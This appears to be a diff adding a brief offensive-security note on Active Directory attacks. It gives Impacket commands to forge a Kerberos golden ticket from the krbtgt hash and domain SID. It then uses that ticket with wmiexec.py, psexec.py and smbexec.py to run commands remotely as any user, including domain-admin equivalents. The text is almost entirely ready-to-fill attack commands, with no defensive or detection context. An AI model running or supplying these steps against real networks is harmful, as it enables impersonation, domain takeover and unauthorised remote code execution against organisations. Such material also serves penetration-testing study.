@@ -1,0 +1,12 @@
+ticketer.py with krbgt account, we can create any ticket to use with kerberos and impersonate any user.
+
+ticketer.py -nthash {kerbero or service nthash} -domain-sid {domain-sid} -domain {domain} {USER}
+
+The command below creates a ticket known golden ticket if kerberos was used that is like a domain admin. It creates a file named user.ccache. This file only can be used with linux, if you want to use this as windows you will need to change the ticket to windows. search in google.
+
+export KRB5CCNAME='{USER}.ccache'
+wmiexec.py {DOMAIN}/{USER}@{HOST} -no-pass -k
+
+psexec.py {DOMAIN}/{USER}@{HOST} -no-pass -k
+
+smbexec.py {DOMAIN}/{USER}@{HOST} -no-pass -k
